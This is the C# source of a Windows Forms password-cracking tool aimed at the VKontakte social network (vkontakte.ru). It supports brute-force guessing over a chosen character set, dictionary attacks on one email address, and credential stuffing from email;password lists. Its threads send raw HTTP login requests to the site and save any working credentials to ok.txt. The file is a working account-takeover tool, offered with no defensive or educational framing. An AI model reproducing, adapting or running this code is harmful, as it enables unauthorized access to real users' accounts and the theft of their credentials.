using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Vkontakte
{
    public partial class Form1 : Form
    {
        public Thread[] threads;
        public bool paused = false;
        public bruteforce brute;
        public Form1()
        {
            InitializeComponent();
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AboutBox1 ab = new AboutBox1();
            ab.Show();
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            emailBox.Enabled = true;
            charsBox.Enabled = true;
            dictonaryBox.Enabled = false;
            lengthBox.Enabled = true;
        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            emailBox.Enabled = false;
            charsBox.Enabled = false;
            dictonaryBox.Enabled = true;
            lengthBox.Enabled = false;
        }

        private void radioButton3_CheckedChanged(object sender, EventArgs e)
        {
            emailBox.Enabled = true;
            dictonaryBox.Enabled = true;
            charsBox.Enabled = false;
            lengthBox.Enabled = false;
        }

        private void startbutton_Click(object sender, EventArgs e)
        {
            startbutton.Enabled = false;
            pausebutton.Enabled = true;
            button1.Enabled = true;
            paused = false;
            if (radioButton1.Checked == true)
            {
                brute = new bruteforce(charsBox.Text, int.Parse(lengthBox.Text), emailBox.Text, listBox1);
                threads = new Thread[int.Parse(lengthBox.Text)];
                for (int i = 0; i < threads.Length; i++)
                {
                    threads[i] = new Thread(new ThreadStart(brute.start));
                    threads[i].Start();
                }
            }
            if (radioButton2.Checked)
            {
                openFileDialog1.ShowDialog();
                try
                {
                    dictonaryBox.Text = openFileDialog1.FileName;
                    FileInfo fInfo = new FileInfo(dictonaryBox.Text);
                    StreamReader sReader = fInfo.OpenText();
                    brute = new bruteforce(sReader, listBox1);
                    threads = new Thread[int.Parse(lengthBox.Text)];
                    for (int i = 0; i < threads.Length; i++)
                    {
                        threads[i] = new Thread(new ThreadStart(brute.start));
                        threads[i].Start();
                    }
                }
                catch { }
            }
            if (radioButton3.Checked)
            {
                openFileDialog1.ShowDialog();
                try
                {
                    dictonaryBox.Text = openFileDialog1.FileName;
                    FileInfo fInfo = new FileInfo(dictonaryBox.Text);
                    StreamReader sReader = fInfo.OpenText();
                    brute = new bruteforce(emailBox.Text, sReader, listBox1);
                    threads = new Thread[int.Parse(lengthBox.Text)];
                    for (int i = 0; i < threads.Length; i++)
                    {
                        threads[i] = new Thread(new ThreadStart(brute.start));
                        threads[i].Start();
                    }
                }
                catch { }
            }
            timer1.Enabled = true;
        }

        private void pausebutton_Click(object sender, EventArgs e)
        {
            try
            {
                if (!paused)
                {
                    timer1.Enabled = false;
                    for (int i = 0; i < threads.Length; i++)
                    {
                        threads[i].Suspend();
                    }
                    paused = true;
                    pausebutton.Text = "Возобновить";
                }
                else
                {
                    timer1.Enabled = true;
                    for (int i = 0; i < threads.Length; i++)
                    {
                        threads[i].Resume();
                    }
                    paused = false;
                    pausebutton.Text = "Приостановить";
                }
            }
            catch { }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (threads != null)
            {
                try
                {
                    for (int i = 0; i < threads.Length; i++)
                    {
                        threads[i].Abort();
                    }
                    timer1.Enabled = false;
                }
                catch { }
                threads = null;
                listBox1.Items.Add("Все потоки остановлены");
                startbutton.Enabled = true;
                pausebutton.Enabled = false;
                button1.Enabled = false;
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                for (int i = 0; i < threads.Length; i++)
                {
                    threads[i].Abort();
                }
            }
            catch { }
            Application.ExitThread();
            Application.Exit();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label6.Text = brute.pass_count.ToString();
        }

        private void lengthBox_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {

        }
    }



    public class bruteforce
    {
        public int mode = 0;       // Способ брута
        public int length = 0;     // Длина генерируемых паролей
        public string target = String.Empty;
        public string password = String.Empty;
        private StreamReader sReader;
        public char[] chars;        // Алфавит
        public int[] x;
        Vkontakte vk = null;
        public int count = 0;
        public Int32 pass_count = 0;

        public bruteforce(string chars_string, int i, string email, ListBox lBox)     // Mode 0;
        {
            this.vk = new Vkontakte(lBox);
            this.mode = 0;
            this.chars = getChars(chars_string);    // Определили алфавит
            this.length = i;                        // Длина паролей
            this.target = email;
            this.count = this.chars.Length;
            this.x = new int[i];        //  count ^ i
        }

        public bruteforce(StreamReader s, ListBox lBox)                               // Mode 1;
        {
            this.vk = new Vkontakte(lBox);
            this.mode = 1;
            this.sReader = s;
        }

        public bruteforce(string email, StreamReader s, ListBox lBox)
        {
            this.vk = new Vkontakte(lBox);
            this.mode = 2;
            this.target = email;
            this.sReader = s;
        }

        public char[] getChars(string s)
        {
            char[] temp = new char[s.Length];
            for (int i = 0; i < s.Length; i++)
            {
                temp[i] = s[i];
            }
            return temp;
        }

        public string write(int[] x, char[] y, int l)
        {
            string str = "";
            for (int i = 0; i < l; i++)
            {
                str = str + y[x[i]];
            }
            return str;
        }

        public bool plus(int[] x, int length, int m)
        {
            int i = length - 1;
            x[i]++;
            while ((x[i] == m) && (i >= 0))
            {
                x[i] = 0;
                if (i > 0)
                {
                    i--;
                    x[i]++;
                }
                else return false;
            }
            return true;
        }

        public string getEmail(string s)
        {
            return s.Substring(0, s.Length - (s.Length - s.IndexOf(';')));
        }

        public string getPassword(string s)
        {
            return s.Substring(s.IndexOf(';') + 1, s.Length - s.IndexOf(';') - 1);
        }

        public void start()
        {
            switch (mode)
            {
                case 0:
                    while (plus(x, length, count))
                    {
                        password = write(x, chars, length);
                        vk.Login(target, password);
                        pass_count++;
                    }
                    break;
                case 1:
                    while (!sReader.EndOfStream)
                    {
                        string s = sReader.ReadLine();
                        target = getEmail(s);
                        password = getPassword(s);
                        vk.Login(target, password);
                        pass_count++;
                    }
                    break;
                case 2:
                    while (!sReader.EndOfStream)
                    {
                        password = sReader.ReadLine();
                        vk.Login(target, password);
                        pass_count++;
                    }
                    break;
            }
        }

    }

    public class Vkontakte
    {
        public const string url = "vkontakte.ru";
        public const string Ok = "HTTP/1.1 302";
        public const string Wrong = "HTTP/1.1 200";
        public ListBox l;

        public Vkontakte(ListBox lBox)
        {
            l = lBox;
        }

        public bool Login(string email, string pass)
        {
            IPHostEntry hostEntry = Dns.GetHostEntry(url);
            IPAddress address = hostEntry.AddressList[0];
            IPEndPoint ipe = new IPEndPoint(address, 80);
            Socket socket = new Socket(ipe.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            try
            {
                socket.Connect(ipe);
                if (socket.Connected)
                {
                    l.Items.Add("Connected to " + ipe.ToString());
                }
                else
                {
                    l.Items.Add("Can not connect...");
                }
            }
            catch (Exception ex)
            {
                l.Items.Add(ex.Message);
            }

            string parameters = "success_url=&fail_url=&try_to_login=1&email=" + email + "&pass=" + pass;
            byte[] par = Encoding.ASCII.GetBytes(parameters);
            string request = "POST /login.php HTTP/1.0\r\n" +
                "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*\r\n" +
                "Accept-Language: en-us\r\n" +
                "Accept-Encoding: gzip, deflate\r\n" +
                "User-Agent: Mozilla/4.0\r\n" +
                "Content-Length: " + par.Length + "\r\n" +
                "Host: " + url + "\r\n" +
                "Content-Type: application/x-www-form-urlencoded\r\n\r\n" +
                parameters;
            Byte[] bytesSent = Encoding.ASCII.GetBytes(request);
            Byte[] bytesReceived = new Byte[12];
            socket.Send(bytesSent, bytesSent.Length, 0);
            int bytes = 0;
            bytes = socket.Receive(bytesReceived, bytesReceived.Length, 0);
            string page = Encoding.ASCII.GetString(bytesReceived, 0, bytes);
            if (String.Compare(page, Ok) == 0)
            {
                
                l.Items.Add("Password is Ok! [" + pass + "]");
                FileInfo fInfo = new FileInfo("ok.txt");
                StreamWriter sWriter = fInfo.CreateText();
                sWriter.WriteLine(email + ";" + pass);
                sWriter.Close();
                socket.Close();
                return true;
            }
            else
            {
                l.Items.Add("Wrong password! [" + pass + "]");
                socket.Close();
                return false;
            }
        }
    }

}
